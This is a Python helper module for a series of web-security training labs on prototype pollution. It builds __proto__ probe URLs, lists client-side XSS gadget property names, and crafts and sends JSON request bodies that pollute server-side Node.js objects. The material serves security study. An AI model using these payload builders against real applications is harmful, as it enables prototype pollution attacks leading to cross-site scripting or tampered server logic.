"""
utils.py — shared helpers for the Prototype Pollution module labs.

📝 Note: this module splits cleanly in two. Labs 1-6 are CLIENT-side —
the vulnerable code runs in the victim's browser (merging a URL/JSON
source into an object without guarding against a `__proto__` key), so like
Clickjacking/DOM-based, the deliverable is mostly a crafted URL or an
exploit-server HTML page, not a Python request. Labs 7-10 are SERVER-side
— a Node.js backend merges a JSON request body unsafely, which IS a normal
`requests` POST exploit. `get_session()` below is used by labs 7-10 only.
"""

from proxies import BURP_PROXIES, VERIFY_SSL
import requests


def get_session():
    s = requests.Session()
    s.proxies.update(BURP_PROXIES)
    s.verify = VERIFY_SSL
    return s


def log(msg, ok=True):
    prefix = "[+]" if ok else "[-]"
    print(f"{prefix} {msg}")


def note(msg):
    """📝 Educational aside — prints a short explainer inline with exploit output."""
    print(f"📝 {msg}")


def fetch_page_source(session, url):
    r = session.get(url)
    log(f"Fetched {url} ({len(r.text)} bytes)")
    return r.text


def grep_for_patterns(source, patterns):
    """Spot likely merge/clone sinks in client-side JS source."""
    found = {}
    for p in patterns:
        hit = p in source
        found[p] = hit
        log(f"  {'FOUND' if hit else 'absent'}: {p!r}", ok=hit)
    return found


# ---- Client-side (browser) probes --------------------------------------

def build_pollution_probe_url(base_url, param_path="__proto__[test]", value="polluted"):
    """
    The classic detection probe: pollute a property via a bracket/dot-path
    query parameter, then check (via the Visualizer/browser console, or the
    page's own behavior) whether Object.prototype.test now exists globally.
    """
    return f"{base_url}?{param_path}={value}"


# Standard gadget for turning a client-side pollution into DOM XSS: many
# sites' own JS reads a config-style property (commonly something checked
# via "html"/"innerHTML"-adjacent naming, or a templating library's own
# option) straight from the polluted prototype without the page ever
# explicitly setting it — polluting THAT property name is the usual win.
CLIENT_XSS_GADGET_CANDIDATES = [
    "transport_url",   # known gadget in some lab builds' analytics loader
    "unsafe",           # some sanitizer config checks `options.unsafe`
    "html",
    "innerHTML",
]


# ---- Server-side (Node.js JSON body) payloads ---------------------------

def build_json_pollution_payload(target_property, value, base_object=None):
    """
    Standard server-side pollution shape: a JSON body whose __proto__ key
    carries the property to pollute. `base_object` lets you wrap it inside
    whatever top-level field the real endpoint expects (e.g. a nested
    "user" object), since the merge target varies per lab.
    """
    import json
    payload = {"__proto__": {target_property: value}}
    if base_object:
        base_object = dict(base_object)
        base_object.update(payload)
        return json.dumps(base_object)
    return json.dumps(payload)


def send_json_pollution(session, url, target_property, value, base_object=None, method="POST"):
    body = build_json_pollution_payload(target_property, value, base_object)
    r = session.request(method, url, data=body, headers={"Content-Type": "application/json"})
    return r
